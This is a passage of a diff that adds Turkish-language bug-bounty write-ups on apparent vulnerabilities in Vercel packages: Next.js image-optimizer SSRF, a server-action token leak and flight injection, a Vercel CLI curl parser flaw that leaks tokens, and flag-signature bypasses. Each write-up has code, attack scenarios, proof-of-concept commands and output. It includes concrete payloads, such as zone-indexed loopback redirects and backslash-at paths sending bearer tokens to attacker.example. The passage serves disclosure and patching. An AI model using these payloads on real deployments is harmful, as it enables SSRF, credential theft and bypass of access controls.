+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-15-nextjs-action-handler-redirect-token-leak-and-flight-injection.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-NEXT-15": {
+    "RED": {
+      "package_tested": "next@16.4.3",
+      "hackerone_report": "#4152250 (with 2 follow-up comments mounted)",
+      "prerender_manifest_previewModeId": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
+      "attacker_received_x_next_revalidate_tag_token": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
+      "leaked_token_matches_prerender_manifest_previewModeId": true,
+      "forged_flight_stream_injected_into_action_response": true,
+      "response_build_id_field_b": null,
+      "client_build_id_check_bypassed": true,
+      "injected_cors_header_on_victim_origin": "https://attacker-oauth.example"
+    },
+    "GREEN": {
+      "internal_redirect_fetch_mode": "manual",
+      "scheme_relative_redirect_rejected": true,
+      "external_hop_followed_by_server": false,
+      "attacker_received_x_next_revalidate_tag_token": null,
+      "forged_flight_stream_injected_into_action_response": false
+    }
+  }
+}
+```
+
+#### 5. Monte Edilen HackerOne Takip Yorumları
+### Monte Edilen HackerOne `#4152250` Takip Yorumu #1 (`RE-EVALUATION-COMMENT-4152250.md`)
+
+1. **Ayrı Bir Open-Redirect Hatasına Gerek Kalmadan `302` Hedefinin Gerçek Next.js Uygulamalarında Neden Saldırgan Kontrolünde Olduğu:**
+   - **Desen 1 — Çok Kiracılı (Multi-Tenant) Kurumsal SSO / OIDC Keşfi:** `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` çağrısı kiracının kendi IdP sunucusuna (`https://idp.attacker-corp.com/oauth2/authorize`) `302 Found` döndürür.
+   - **Desen 2 — OAuth 2.0 / OIDC Sağlayıcı Onay Server Action'ları:** `redirect('/api/oauth/complete?session=...')` kayıtlı OAuth istemcisinin `redirect_uri` adresine `302 Found` döndürür.
+   - **Desen 3 — Giden Bağlantı / Ödeme Yönlendiricileri:** `redirect(\`/out?dest=${partnerUrl}\`)` dış hedefe `302 Found` döndürür.
+2. **`revalidateTag()` Çağrılmasa Bile Oluşan İkincil Kritik Etki — Aynı Kökenli RSC Flight Akışı Ele Geçirme ve Universal XSS (`UXSS`):**
+   - `handleAction()` (`action-handler.js:1007`), `createRedirectRenderResult()` çalışmadan ÖNCE `x-action-redirect: /api/oauth-bounce;push` başlığını ayarlar.
+   - İstemci tarafındaki `server-action-reducer.js:161-162` dosyasında `if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())` kontrolü yer alır. Dış sunucu RSC Flight yanıtında `"b"` alanını göndermediğinde (`responseBuildId === undefined`), Build ID doğrulaması tamamen atlanır ve `dangerouslySetInnerHTML` içeren sahte Virtual DOM doğrudan `https://victim-app.com` içerisine monte edilerek **Universal XSS (`UXSS`)** tetiklenir!
+3. **Keyfi HTTP Yanıt Başlığı Enjeksiyonu (`copyResponseHeaders`):**
+   - `actionsForbiddenHeaders` (`action-handler.js:230-241`) yalnızca 9 başlığı filtrelediği için dış sunucu `https://victim-app.com` yanıtına `Access-Control-Allow-Origin: https://attacker.example`, `Access-Control-Allow-Credentials: true` ve `Clear-Site-Data: "storage"` enjekte edebilir.
+
+### Monte Edilen HackerOne `#4152250` Takip Yorumu #2 (`ADDENDUM-SCENARIOS-4152250.md`)
+
+- **Senaryo A (`previewModeId` Çalınması):** Canlı `next@16.4.3` üzerinde `"leaked_token_matches_prerender_manifest_previewModeId": true` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) doğrulandı.
+- **Senaryo B (Küresel On-Demand ISR Önbellek Sıfırlama):** Çalınan `previewModeId` ile `x-prerender-revalidate` başlığı gönderildiğinde önbellekli ISR rotalarının sıfırlandığı doğrulandı.
+- **Senaryo C (Build-ID Atlamalı Aynı Kökenli RSC Flight Enjeksiyonu & UXSS):** `response_build_id_field_b: null`, `client_build_id_check_bypassed: true` ve `injected_cors_header_on_victim_origin: "https://attacker-oauth.example"` canlı olarak kanıtlandı.
+
+
+---
+
+### III.40 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js `/_next/image` (`fetchExternalImage`) `3xx` Yönlendirme `remotePatterns` İzin Listesi Atlaması ve `isPrivateIp()` Fail-Open Loopback/İç Ağ SSRF (`VERCEL-NEXT-09` / HackerOne `#4152265`) (`CWE-918 / CWE-863`, CVSS `7.5 High`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/next.js` (`npm / Node.js: next`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/image-optimizer.ts:696-729`, `packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`)
+* **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-863` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — `remotePatterns` Kontrolünün Yalnızca İlk İstek Hopunda Yapılması (`image-optimizer.js:586-615`):** `validateParams()` fonksiyonu `hasMatch(domains, remotePatterns, href)` kontrolünü yalnızca ilk `/_next/image?url=...` parametresinde çalıştırır. İzin verilen sunucu `301`/`302`/`307`/`308` döndürdüğünde `fetchExternalImage()` yeni `Location` adresini yalnızca `validateUrl()` fonksiyonuna sokar; `hasMatch()` kontrolünü tekrar çağırmaz. Böylece hem **aynı sunucu içindeki dizin kısıtlamaları** (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) hem de **farklı alan adı kısıtlamaları** tamamen aşılır.
+2. **Adım 2 — Monte Edilen HackerOne Yorumu #1 (`RE-EVALUATION-COMMENT-4152265`): İlk Hop İçin Ele Geçirilmiş Sunucuya Neden Gerek Yoktur:** Gravatar (`?d=https://...`), Cloudinary ve çok kiracılı S3 / R2 / Supabase Storage / Vercel Blob kovaları tasarım gereği `301`/`302` yönlendirmesi üretir.
+3. **Adım 3 — Monte Edilen HackerOne Yorumu #1 (`RE-EVALUATION-COMMENT-4152265`): NAT64 Olmadan Standart Linux/Docker Çekirdeğinde Doğrudan `127.0.0.1` Soketine Bağlanma (`if (!ipaddr.isValid(ip)) return false`):** `next/dist/compiled/ipaddr.js` içindeki IPv6 `zoneIndex` düzenli ifadesi (`const o = "%[0-9a-z]{1,}"`) tire (`-`), alt çizgi (`_`) ve nokta (`.`) karakterlerini reddeder. Standart Linux/Docker/K8s sunucularındaki `br-1a49f5828144`, `docker_gwbridge`, `cni-podman0` gibi arayüzlerde `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` çekirdekte başarılı olur, `ipaddr.isValid()` `false` döner, `isPrivateIp()` **fail-open (`return false`)** yapar ve Node.js `http.get` doğrudan `127.0.0.1` loopback soketine bağlanarak iç yanıtı sızdırır!
+4. **Adım 4 — Monte Edilen HackerOne Yorumu #1 & #2 (`ADDENDUM-SCENARIOS-4152265`): WHATWG `URL` vs. `ipaddr.js` RFC 4291 `::7f00:1` Ayrıştırıcı Farkı ve RFC 8215 `64:ff9b:1::/48` NAT64 Atlaması:** `Location: http://[::127.0.0.1]:8080/internal.png` adresi WHATWG `new URL()` tarafından `::7f00:1` olarak normalize edilir; `ipaddr.parse('::7f00:1').range()` ve `ipaddr.parse('64:ff9b:1::a9fe:a9fe').range()` `'unicast'` döndürdüğü için `isPrivateIp()` `false` verir!
+
+```javascript
+// 1. Missing matchRemotePattern / hasMatch check on 3xx redirects in fetchExternalImage()
+// File: node_modules/next/dist/esm/server/image-optimizer.js (lines 586-615)
+if (res.status >= 300 && res.status < 400 && res.headers.get('location')) {
+    if (redirectCount >= maxRedirects) {
+        throw new ImageError(400, '"url" parameter reached maxRedirects');
+    }
+    const redirectUrl = new URL(res.headers.get('location'), href).href;
+    const parsedRedirectUrl = new URL(redirectUrl);
+    // BUG 1 (09A): Only calls validateUrl(parsedRedirectUrl); NEVER re-checks hasMatch(domains, remotePatterns, parsedRedirectUrl)!
+    await validateUrl(parsedRedirectUrl);
+    return fetchExternalImage(redirectUrl, dangerouslyAllowLocalIP, redirectCount + 1);
+}
+
+// 2. isPrivateIp() fails open on hyphenated Linux IPv6 zone indices & RFC 4291 / RFC 8215 ranges
+// File: node_modules/next/dist/esm/server/lib/find-root.js
+function isPrivateIp(ip) {
+    if (!ipaddr.isValid(ip)) {
+        return false; // BUG 2 (09B): Fail-open! "::ffff:127.0.0.1%br-1a49f5828144" -> isValid=false -> returns false!
+    }
+    const addr = ipaddr.parse(ip);
+    const range = addr.range(); // BUG 3 (09B): "::7f00:1" and "64:ff9b:1::a9fe:a9fe" -> range="unicast" -> returns false!
+    return PRIVATE_IP_RANGES.includes(range);
+}
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
+* **Senaryo A — Aynı Sunucu Üzerinde `pathname` Kısıtlamasını Atlama (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) (Monte Edilen HackerOne `#4152265` Senaryo A):** Uygulama `remotePatterns` ile yalnızca `/public-avatars/**` dizinine izin verirken, bu dizindeki bir `302` yönlendirmesi `fetchExternalImage()` fonksiyonunu `/private-kyc-docs/passport-scan.png` adresine taşır ve özel belgeyi `200 OK` olarak sızdırır.
+* **Senaryo B — İzinli Avatar/Depolama Servisi Üzerinden İzin Listesi Dışındaki Sunuculara SSRF Sıçraması (Monte Edilen HackerOne `#4152265` Yorum #1 & Senaryo B):** Gravatar (`?d=https://...`) veya çok kiracılı S3/Supabase/R2 kovası üzerinden verilen `301`/`302` yanıtı ile `remotePatterns` izin listesi tamamen atlanarak izin verilmeyen dış/iç sunuculardan görüntü çekilir.
+* **Senaryo C — Zincirleme `09A -> 09B` İle Standart Linux/Docker Çekirdeğinde Doğrudan `127.0.0.1` Loopback Soketine Bağlanma ve SSRF (Monte Edilen HackerOne `#4152265` Yorum #1 & Senaryo C):** İzinli ilk hop `Location: http://[::ffff:127.0.0.1%25br-1a49f5828144]:45829/admin-badge.png` (veya `::7f00:1` / `64:ff9b:1::a9fe:a9fe`) döndürdüğünde `isPrivateIp()` fail-open (`return false`) yapar ve Node.js `http.get` doğrudan `127.0.0.1` loopback soketine bağlanarak iç servis yanıtını sızdırır!
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect fetchExternalImage and isPrivateIp in next@16.4.3
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/image-optimizer.js | sed -n '586,615p'
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/lib/find-root.js | sed -n '100,145p'
+
+# 2. Run the Live next@16.4.3 End-to-End Verification Harness (09A + 09B + Linux Loopback Socket Proof)
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-09-nextjs-image-optimizer-redirect-and-nat64-ssrf.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-NEXT-09": {
+    "RED": {
+      "package_tested": "next@16.4.3",
+      "hackerone_report": "#4152265 (with 2 follow-up comments mounted)",
+      "same_host_pathname_bypass_status": 200,
+      "cross_host_allowlist_bypass_status": 200,
+      "scoped_loopback_input": "::ffff:127.0.0.1%br-1a49f5828144",
+      "ipaddr_isValid": false,
+      "nextjs_isPrivateIp_returned": false,
+      "loopback_server_hit": true,
+      "remote_address_seen_by_server": "::ffff:127.0.0.1",
+      "rfc4291_ipv4_compatible_isPrivateIp": false,
+      "rfc8215_local_nat64_isPrivateIp": false
+    },
+    "GREEN": {
+      "redirect_hop_rechecks_hasMatch_remotePatterns": true,
+      "invalid_or_hyphenated_zone_ip_fails_closed": true,
+      "rfc4291_and_rfc8215_blocked": true,
+      "loopback_server_hit": false
+    }
+  }
+}
+```
+
+#### 5. Monte Edilen HackerOne Takip Yorumları
+### Monte Edilen HackerOne `#4152265` Takip Yorumu #1 (`RE-EVALUATION-COMMENT-4152265.md`)
+
+1. **`remotePatterns` Atlaması İçin Ele Geçirilmiş Sunucuya Gerek Yoktur (`FINDING-09A`):**
+   - **Vektör A (Aynı Sunucu Üzerinde `pathname` Kısıtlamasını Atlama):** Aynı alan adında `/public-avatars/**` kısıtlamasını aşarak `/private-kyc-docs/passport-scan.png` dosyasını okur.
+   - **Vektör B (Popüler İzinli Görsel Servislerindeki Yerleşik Yönlendiriciler):** Gravatar (`?d=https%3A%2F%2F...`), Cloudinary ve çok kiracılı S3 / R2 / Supabase Storage / Vercel Blob kovaları herhangi bir sunucu ele geçirilmesine gerek olmadan doğal olarak `301`/`302` yönlendirmesi üretir.
+2. **NAT64 Gerekmeden `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`) İle Doğrudan Linux `127.0.0.1` Soketine Bağlanma:**
+   - `next/dist/compiled/ipaddr.js` içindeki IPv6 `zoneIndex` regex'i (`const o = "%[0-9a-z]{1,}"`) tire (`-`), alt çizgi (`_`) ve nokta (`.`) karakterlerini reddeder.
+   - Standart Linux / Docker / Kubernetes ortamlarındaki `br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1` arayüzlerinde `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` çekirdek seviyesinde başarılı olur, `ipaddr.isValid()` `false` döner, `isPrivateIp()` **fail-open (`return false`)** yapar ve Node.js `http.get` doğrudan `127.0.0.1` TCP soketine bağlanır!
+3. **WHATWG `URL` vs. `ipaddr.js` RFC 4291 (`::7f00:1` & `0:0:0:0:0:0:127.0.0.1`) Ayrıştırıcı Farkı:**
+   - `new URL('http://[::127.0.0.1]')` adresi `::7f00:1` olarak normalize edilir ve `ipaddr.parse('::7f00:1').range()` `'unicast'` döndürdüğü için `isPrivateIp()` `false` verir!
+
+### Monte Edilen HackerOne `#4152265` Takip Yorumu #2 (`ADDENDUM-SCENARIOS-4152265.md`)
+
+- **Senaryo A (Aynı Sunucu `pathname` Atlaması):** `/public-avatars/redirect-to-private` -> `/private-kyc-docs/passport-scan.png` (`200 OK`, `68 byte`) doğrulandı.
+- **Senaryo B (Farklı Sunucu İzin Listesi Atlaması):** `allowed-cdn.example` -> `unapproved-internal.example` (`200 OK`) doğrulandı.
+- **Senaryo C (`09A -> 09B` Zinciri İle Doğrudan `127.0.0.1` Loopback Soketine Bağlanma):** Canlı `next@16.4.3` üzerinde `loopback_server_hit: true`, `remote_address_seen_by_server: "::ffff:127.0.0.1"`, `status: 200`, `bytes_exfiltrated: 68` kanıtlandı.
+
+
+---
+
+### III.41 — vercel/vercel (`vercel <= 65.4.0 (verified on published npm vercel@65.4.0)`) — Vercel CLI (`vercel@65.4.0`) `vercel curl` / `vercel http` WHATWG `URL` vs. `libcurl` Ters Eğik Çizgi / Süslü Parantez Ayrıştırıcı Farkı İle Canlı Bearer Token ve `x-vercel-protection-bypass` Sızıntısı (`VERCEL-CLI-07`) (`CWE-200 / CWE-436`, CVSS `8.2 High`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: vercel`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 65.4.0 (verified on published npm vercel@65.4.0)` — `packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`, `packages/cli/src/commands/http-cli/index.ts`
+* **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-436` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — WHATWG `new URL()` İle `libcurl` (`curl_url_set`) Arasındaki Ters Eğik Çizgi (`\\@`) Ayrıştırıcı Farkı (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` fonksiyonu `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...` kontrolünü yaptıktan sonra normalize edilmiş `url.href` yerine **ham metin birleştirmesini** (`return \`${baseUrl}${normalizedPath}\``) döndürür. `path` olarak `\\@attacker.example/collect` verildiğinde WHATWG `new URL()` bunu aynı kökenli bir dizin yolu sayarken, `/usr/bin/curl` ikili dosyasına giden `https://my-app.vercel.app\\@attacker.example/collect` dizgesi `libcurl` tarafından `my-app.vercel.app\\` kullanıcı adıyla **`attacker.example`** sunucusuna yapılan bir istek olarak ayrıştırılır!
+2. **Adım 2 — `libcurl` Globbing (`{a,b}`) ve `--next` Bayrak Farkı (`utils.ts:34-42`):** `@attacker.example/{a,b}` yolu WHATWG `URL` tarafından bağıl dizin olarak görülürken `libcurl` globbing motoru tarafından dış sunucu isteğine dönüştürülür.
+3. **Adım 3 — Canlı `Authorization: Bearer` ve `x-vercel-protection-bypass` Sırlarının Dış Sunucuya Gönderilmesi (`utils.ts:74-96`):** `vercel curl`, oluşturulan `curl` sürecine otomatik olarak `--header "Authorization: Bearer <VERCEL_TOKEN>"` ve `x-vercel-protection-bypass` başlıklarını eklediği için tüm kimlik bilgileri doğrudan saldırganın sunucusuna akar.
+
+```typescript
+// File: packages/cli/src/commands/curl/utils.ts (lines 179-216)
+export function constructFullUrl(baseUrl: string, path: string): string {
+  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
+  const url = new URL(normalizedPath, baseUrl);
+  if (url.origin !== baseUrl) {
+    throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
+  }
+  // BUG: Returns raw string concatenation instead of normalized url.href, and does not
+  // pass '--globoff' to curl! Input '\\@attacker.com/p' passes new URL() origin check
+  // but libcurl parses 'baseUrl\\' as userinfo and 'attacker.com' as target host!
+  return `${baseUrl}${normalizedPath}`;
+}
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
+* **Senaryo A — CI/CD PR Önizleme Test Hattında Canlı Vercel Token ve Bypass Sırrının Çalınması:** CI/CD hattında çalışan `vercel curl "$PREVIEW_PATH"` komutuna `\\@127.0.0.1:41992/exfil` verildiğinde `constructFullUrl()` kontrolünden geçer; ancak `/usr/bin/curl` doğrudan saldırgan sunucusuna bağlanarak `Authorization: Bearer vcp_live_...` ve `x-vercel-protection-bypass` sırlarını teslim eder.
+* **Senaryo B — Geliştirici Terminali veya AI Ajanı Üzerinden Kimlik Bilgisi Sızıntısı:** Korumalı bir Vercel dağıtımını test eden geliştirici veya AI ajanı `vercel curl '\@logs-collector.example/api/debug'` çalıştırdığında canlı Vercel API anahtarı dış sunucuya sızar.
+* **Senaryo C — Otomatik Üretilen Proje Geneli Bypass Sırrının Sızması (`FINDING-07B`):** `ensureProtectionBypassSecret()` fonksiyonu `PATCH /v10/projects/{id}/protection-bypass` ile kalıcı bir proje bypass sırrı üretir ve aynı istekte dış sunucuya sızdırır.
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect constructFullUrl in published vercel@65.4.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/vercel/dist/commands/curl/utils.js | sed -n '1,180p'
+
+# 2. Run the Live vercel@65.4.0 End-to-End Verification Harness against /usr/bin/curl
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-07-cli-curl-flag-and-url-hardening.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-CLI-07": {
+    "RED": {
+      "package_tested": "vercel@65.4.0",
+      "curl_binary": "/usr/bin/curl 8.5.0",
+      "ConstructFullUrl_output": "https://my-protected-deployment.vercel.app/\\@127.0.0.1:38343/exfiltrate",
+      "whatwg_origin_check_passed": true,
+      "attacker_listener_received_request": true,
+      "leaked_authorization": "Bearer vcp_live_SECRET_VERCEL_CLI_TOKEN_998877",
+      "leaked_protection_bypass": "0123456789abcdef0123456789abcdef"
+    },
+    "GREEN": {
+      "backslash_and_at_segment_rejected": true,
+      "returns_normalized_url_href": true,
+      "curl_invoked_with_globoff": true,
+      "attacker_listener_received_request": false
+    }
+  }
+}
+```
+
+
+---
+
+### III.42 — vercel/flags (`@vercel/flags-core <= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)`) — Vercel `@vercel/flags-core@1.10.2` Öneksiz `x-datafile-Updated-At` Başlığı İle Watermark Zehirlemesi ve Kalıcı Özellik Bayrağı (Feature Flag) Dondurma DoS (`VERCEL-FLAGS-CORE-06`) (`CWE-400 / CWE-345`, CVSS `6.5 Medium`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/flags` (`npm / Node.js: @vercel/flags-core`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)` — `packages/flags-core/src/controller.ts:555-615`, `packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`)
+* **Zafiyet Sınıfı & Skor:** `CWE-400 / CWE-345` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — Yanıt Gövdesi ve `res.ok` Doğrulanmadan `datafileUpdatedAtWatermark` Değerinin Güncellenmesi (`packages/flags-core/src/controller.ts:555-615`):** `@vercel/flags-core` içindeki `streamResponse()` metodu, `res.ok` (`200 OK`) durumunu ve geçerli bir JSON veri dosyasını doğrulamadan `x-datafile-Updated-At` başlığını okuyup `this.datafileUpdatedAtWatermark` değerini günceller.
+2. **Adım 2 — `x-vercel-*` Öneki Olmayan Başlık Yüzeyi:** Başlık `x-vercel-*` önekine sahip olmadığı için hata yanıtları veya ara vekil sunucular üzerinden `x-datafile-Updated-At: 9999999999999` enjekte edilebilir.
+3. **Adım 3 — Acil Durum Kill-Switch ve Feature Flag Güncellemelerinin Kalıcı Olarak Kilitlenmesi:** `datafileUpdatedAtWatermark` değeri `9999999999999` olduktan sonra gerçek zaman damgalı tüm bayrak güncellemeleri (`updatedAt <= this.datafileUpdatedAtWatermark`) süreç yeniden başlatılana kadar sessizce çöpe atılır.
+
+```typescript
+// File: packages/flags-core/src/controller.ts (lines 555-615)
+const res = await fetch(`${this.serviceUrl}/v1/stream`, { headers });
+const updatedAtHeader = res.headers.get('x-datafile-Updated-At');
+if (updatedAtHeader) {
+  const updatedAt = Number(updatedAtHeader);
+  if (!Number.isNaN(updatedAt)) {
+    // BUG: Updates watermark BEFORE checking res.ok or validating the JSON datafile payload,
+    // and accepts arbitrarily far-future timestamps (e.g. 9999999999999)!
+    this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt);
+  }
+}
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
+* **Senaryo A — Olay Müdahalesi Sırasında Acil Durum Kill-Switch Bayrağının Devreye Girememesi:** `x-datafile-Updated-At: 9999999999999` içeren tek bir `503` yanıtı `datafileUpdatedAtWatermark` değerini zehirler; operatörler acil durum bayrağını kapatsa bile uygulama eski (`stale-compromised-variant`) değerde takılı kalır.
+* **Senaryo B — `redirect: 'manual'` Eksikliği Nedeniyle Yönlendirme Takibi:** `streamResponse()` içindeki `fetch()` çağrısında `redirect: 'manual'` bulunmadığı için `302` yönlendirmeleri otomatik takip edilir.
+* **Senaryo C — Uzun Ömürlü Node.js Sunucularında Kalıcı Durum Kayması:** Zehirlenen iş parçacıkları süreç yeniden başlatılana kadar hiçbir bayrak güncellemesini kabul etmez.
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect streamResponse and readBundledDefinitions in published @vercel/flags-core@1.10.2
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/flags-core/dist/index.js | sed -n '465,516p'
+
+# 2. Run the Live @vercel/flags-core@1.10.2 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-06-flags-core-controller-stream-hardening.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-FLAGS-CORE-06": {
+    "RED": {
+      "package_tested": "@vercel/flags-core@1.10.2",
+      "initial_flag_value": "stale-compromised-variant",
+      "bundled_legitimate_update_timestamp": 1700000100000,
+      "poisoned_header_sent_on_503": "9999999999999",
+      "flag_value_after_watermark_poisoning": "stale-compromised-variant",
+      "legitimate_bundled_update_ignored": true
+    },
+    "GREEN": {
+      "requires_res_ok_and_valid_datafile_before_watermark_update": true,
+      "rejects_future_timestamp_skew": true,
+      "legitimate_bundled_update_ignored": false
+    }
+  }
+}
+```
+
+
+---
+
+### III.43 — vercel/flags (`flags <= 4.4.0 (verified on published npm flags@4.4.0)`) — Vercel `flags@4.4.0` `deserialize()` Fonksiyonunda `__no_flags__` Sabiti İle Compact JWS İmza Doğrulamasını Atlama (`VERCEL-FLAGS-05`) (`CWE-347`, CVSS `6.5 Medium`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/flags` (`npm / Node.js: flags`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 4.4.0 (verified on published npm flags@4.4.0)` — `packages/flags/src/next/precompute.ts:206-214`, `packages/flags/dist/next/index.js:119-125` (`deserialize`)
+* **Zafiyet Sınıfı & Skor:** `CWE-347` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — JWS İmza Doğrulamasından Önce Koşulsuz `__no_flags__` Dönüşü (`packages/flags/src/next/precompute.ts:206-214`):** `serialize()` fonksiyonu yalnızca `flags.length === 0` olduğunda `'__no_flags__'` üretirken, `deserialize(flags, code, secret)` fonksiyonu `flags.length === 0` olup olmadığını kontrol etmeden ve `compactVerify()` imza doğrulamasına hiç girmeden `if (code === '__no_flags__') return {};` döndürür.
+2. **Adım 2 — Next.js `[code]` Dinamik Rota Parametresine Doğrudan Erişim:** Next.js App Router'da `app/[code]/checkout/page.tsx` yapısını kullanan uygulamalarda `[code]` parametresi URL yolunun bir parçasıdır. Saldırgan imza anahtarına (`FLAGS_SECRET`) sahip olmadan doğrudan `/__no_flags__/checkout` adresini çağırabilir.
+3. **Adım 3 — Edge Middleware Kararının Atlanarak `flag.decide()` Fonksiyonunun Yeniden Çalışması:** `deserialize()` boş nesne `{}` döndürdüğünde `getPrecomputed()` ilgili bayrağı bulamaz ve Edge Middleware'in imzaladığı `false` kararını atlayarak sunucu tarafında `flag.decide()` fonksiyonunu yeniden çalıştırır (`true`).
+
+```typescript
+// File: packages/flags/src/next/precompute.ts (lines 206-214)
+export async function deserialize(
+  flags: ReadonlyArray<Flag<any, any>>,
+  code: string,
+  secret: string | undefined = process.env.FLAGS_SECRET,
+): Promise<Record<string, any>> {
+  if (!secret) throw new Error('flags: deserialize was called without a secret');
+  // BUG: Returns {} BEFORE JWS signature verification even when flags.length > 0!
+  if (code === '__no_flags__') return {};
+  // ... JWS compactVerify() only runs below this line
+}
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
